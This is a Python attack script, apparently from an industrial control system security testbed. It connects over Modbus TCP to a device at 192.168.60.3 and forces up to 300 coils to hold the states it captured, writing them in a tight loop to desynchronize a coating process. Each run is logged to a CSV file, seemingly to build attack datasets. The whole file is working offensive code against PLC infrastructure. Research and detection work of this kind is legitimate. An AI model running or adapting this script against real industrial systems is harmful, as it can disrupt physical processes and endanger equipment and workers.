import time
import csv
import os
import random
from datetime import datetime
from pymodbus.client import ModbusTcpClient
from colorama import Fore, Style
import argparse
from utils import get_enabled_coils

parser = argparse.ArgumentParser(description="Desynchronizer Coating Attack", 
                                usage="python3 desync_coating.py --duration <DURATION>")
parser.add_argument("--duration", help="Duration of the attack in seconds (0 = infinite)", type=int, required=False, default=0)

args = parser.parse_args()

# --- LOGGING SETUP ---
LOG_FILE = "log_desync_coating.csv"

# Define the CSV headers
csv_headers = [
    "id",
    "attack_type",
    "start_time",
    "end_time",
    "duration_seconds",
    "max_coils_scanned",
    "enabled_coils_count",
    "disabled_coils_count",
    "enabled_coils_list",
    "coils_to_disable_list",
    "total_coils_affected",
    "target_host"
]

try: 
    client = ModbusTcpClient(host="192.168.60.3", port=502)
    connection_status = client.connect()
    print(Fore.GREEN + "Connection successfully established" + Style.RESET_ALL)

except:
    print(Fore.RED+"The IP address or the port is incorrect. Please check the configurations."+Style.RESET_ALL)
    exit(1)

# Record start time
start_time = time.time()
start_time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

max_coils = 300
enabled_coils = get_enabled_coils(client, [i for i in range(max_coils)])
coils_to_disable = list(set(range(max_coils)) - set(enabled_coils))

# Sort for cleaner logging
enabled_coils_sorted = sorted(enabled_coils)
coils_to_disable_sorted = sorted(coils_to_disable)

print(f"Attack running... Desynchronizing coils. Press Ctrl+C to stop manually.")
print(f"Enabled coils: {len(enabled_coils)}, Coils to disable: {len(coils_to_disable)}")

# Set up duration
if args.duration > 0:
    end_time = start_time + args.duration
    infinite = False
else:
    infinite = True
    end_time = float('inf')

last_execution = start_time
attack_ended_by = "duration"
loop_count = 0

try:
    while time.time() < end_time:
        current_time = time.time()
        
        # Disable coils that should be off
        for coil in coils_to_disable:
            client.write_coil(coil, False)

        # Enable coils that should be on
        for coil in enabled_coils:
            client.write_coil(coil, True)
        
        loop_count += 1
        last_execution = current_time

except KeyboardInterrupt:
    print(Fore.CYAN + "\nAttack interrupted by user." + Style.RESET_ALL)
    attack_ended_by = "keyboard_interrupt"
finally:
    # Record end time
    end_time_actual = time.time()
    end_time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    actual_duration = end_time_actual - start_time
    
    client.close()
    print(Fore.GREEN + "Connection closed." + Style.RESET_ALL)
    
    # --- LOGGING TO CSV ---
    # Generate a unique ID based on timestamp
    attack_id = datetime.now().strftime("%Y%m%d_%H%M%S") + f"_{random.randint(1000, 9999)}"
    
    # Prepare the row data
    log_row = {
        "id": attack_id,
        "attack_type": "desynchronization",
        "start_time": start_time_str,
        "end_time": end_time_str,
        "duration_seconds": f"{actual_duration:.2f}",
        "max_coils_scanned": max_coils,
        "enabled_coils_count": len(enabled_coils),
        "disabled_coils_count": len(coils_to_disable),
        "enabled_coils_list": str(enabled_coils_sorted),
        "coils_to_disable_list": str(coils_to_disable_sorted),
        "total_coils_affected": len(enabled_coils) + len(coils_to_disable),
        "target_host": "192.168.60.3:502"
    }
    
    # Check if file exists to determine if we need to write headers
    file_exists = os.path.isfile(LOG_FILE)
    
    try:
        with open(LOG_FILE, mode='a', newline='') as csv_file:
            writer = csv.DictWriter(csv_file, fieldnames=csv_headers)
            
            # Write header only if file is new
            if not file_exists:
                writer.writeheader()
            
            # Write the attack record
            writer.writerow(log_row)
        
        print(Fore.CYAN + f"Attack logged to {LOG_FILE} (ID: {attack_id})" + Style.RESET_ALL)
    
    except Exception as e:
        print(Fore.RED + f"Error writing to log file: {e}" + Style.RESET_ALL)